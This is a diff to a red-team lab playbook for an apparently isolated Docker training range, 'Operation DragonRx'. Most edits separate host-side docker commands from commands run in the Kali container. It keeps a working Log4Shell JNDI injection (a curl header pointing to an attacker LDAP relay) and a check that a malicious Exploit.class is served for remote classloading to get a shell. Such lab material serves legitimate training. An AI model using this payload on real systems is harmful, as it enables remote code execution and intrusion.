@@ -1,13 +1,15 @@
 # Attack Playbook — Operation DragonRx
 ## Phase-by-Phase Attack Guide: Exact Commands Against the Deployed Lab
 
-**Operator perspective:** All commands run from the Kali Docker container unless otherwise noted.
+**Operator perspective:** Most commands run from the Kali Docker container. A few use `docker` CLI
+commands that must run on the **host machine** (not inside Kali — Docker is not installed in the container).
 **Lab shell notation:**
+- `[HOST]` — your host terminal (outside any container) — use for `docker logs`, `docker exec`, `make`
 - `[KALI]` — Kali attacker container (`make shell` or `docker exec -it dragonrx_kali /bin/bash`)
 - `[WEB01]` — shell on Ubuntu web server (192.168.10.100), obtained in Phase 1
 - `[WS01]` — Windows 10 psexec session (192.168.10.50)
 - `[DC01]` — Windows Server 2019 Domain Controller (192.168.10.10)
-- `[C2]` — Sliver console (`docker exec -it dragonrx_c2 sliver`)
+- `[C2]` — Sliver console (`docker exec -it dragonrx_c2 sliver`) — run from `[HOST]`
 
 ---
 
@@ -37,6 +39,7 @@
 Run these before touching any attack commands.
 
 ```bash
+[HOST]
 # 0. (First time only) Build the Kali attacker container
 #    This installs nmap, impacket, hashcat, crackmapexec, metasploit, etc.
 #    Skip on subsequent runs — image is cached.
@@ -225,7 +228,7 @@ The `dragonrx_jndi` container handles the entire relay chain automatically:
 ### 1.1 Verify the JNDI Relay is Ready
 
 ```bash
-[KALI]
+[HOST]
 # Check JNDI server container is running and listening
 docker logs dragonrx_jndi 2>&1 | tail -8
 ```
@@ -243,7 +246,10 @@ Listening on 0.0.0.0:1389
 # This sends a JNDI lookup that will fail (no class named 'test') — but confirms callback
 curl -s http://10.0.0.100:8080/ \
   -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'
+```
 
+```bash
+[HOST]
 # Check if JNDI server received the callback
 docker logs dragonrx_jndi 2>&1 | tail -5
 # Expected: "Received connection from 192.168.10.100" or similar
@@ -298,16 +304,20 @@ This log entry survives even if you delete bash history, kill the implant, or ov
 
 **If the shell doesn't land:**
 ```bash
+[HOST]
 # Check the JNDI container caught the request
 docker logs dragonrx_jndi 2>&1 | tail -10
-
-# Check the Exploit.class is being served correctly from within the lab
-curl -s http://10.0.0.20:8080/Exploit.class | file -
-# Should return: Java class data
 
 # Confirm WEB01 JVM version (must be Java 8 pre-u191 for remote classloading)
 docker exec dragonrx_web01 java -version 2>&1
 # Expected: openjdk version "1.8.0_xxx" — where xxx < 191
+```
+
+```bash
+[KALI]
+# Check the Exploit.class is being served correctly
+curl -s http://10.0.0.20:8080/Exploit.class | file -
+# Should return: Java class data
 ```
 
 ---
